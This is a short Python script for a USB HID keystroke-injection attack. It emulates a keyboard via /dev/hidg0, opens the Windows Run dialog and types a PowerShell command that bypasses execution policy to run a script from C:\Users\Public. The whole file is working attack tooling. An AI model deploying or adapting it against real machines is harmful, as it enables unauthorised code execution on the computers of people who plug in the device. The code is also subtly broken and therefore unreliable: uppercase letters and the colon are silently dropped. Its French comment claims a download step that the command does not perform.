#!/usr/bin/env python3
import time

HID = "/dev/hidg0"

def write_report(report):
    with open(HID, 'wb') as fd:
        fd.write(report)

def press_key(keycode, shift=False):
    modifier = 0x02 if shift else 0x00
    write_report(bytes([modifier, 0, keycode, 0, 0, 0, 0, 0]))
    time.sleep(0.02)
    write_report(b'\x00\x00\x00\x00\x00\x00\x00\x00')
    time.sleep(0.02)

KEYS = {
    'a': 0x04, 'b': 0x05, 'c': 0x06, 'd': 0x07, 'e': 0x08, 'f': 0x09,
    'g': 0x0a, 'h': 0x0b, 'i': 0x0c, 'j': 0x0d, 'k': 0x0e, 'l': 0x0f,
    'm': 0x10, 'n': 0x11, 'o': 0x12, 'p': 0x13, 'q': 0x14, 'r': 0x15,
    's': 0x16, 't': 0x17, 'u': 0x18, 'v': 0x19, 'w': 0x1a, 'x': 0x1b,
    'y': 0x1c, 'z': 0x1d,
    '1': 0x1e, '2': 0x1f, '3': 0x20, '4': 0x21, '5': 0x22,
    '6': 0x23, '7': 0x24, '8': 0x25, '9': 0x26, '0': 0x27,
    '-': 0x2d, '=': 0x2e, '[': 0x2f, ']': 0x30, '\\': 0x31,
    ';': 0x33, "'": 0x34, ',': 0x36, '.': 0x37, '/': 0x38,
    ' ': 0x2c,
}

SHIFT_NEEDED = {':', '(', ')', '+', '_', '"', '?'}

def type_string(text):
    for char in text:
        if char in KEYS:
            shift = char in SHIFT_NEEDED or char.isupper()
            press_key(KEYS[char.lower()], shift)
        else:
            pass

# === Injection ===
print("[*] HID Injection starting...")
time.sleep(5)

# Win + R
write_report(b'\x08\x00\x00\x15\x00\x00\x00\x00')
time.sleep(0.4)
write_report(b'\x00\x00\x00\x00\x00\x00\x00\x00')
time.sleep(0.3)

# === Commande unique : telechargement + execution ===
cmd = "powershell -ep bypass -File C:\\Users\\Public\\p.ps1"

type_string(cmd)
time.sleep(0.3)
write_report(b'\x00\x00\x28\x00\x00\x00\x00\x00')

print("[+] Commande injectee")
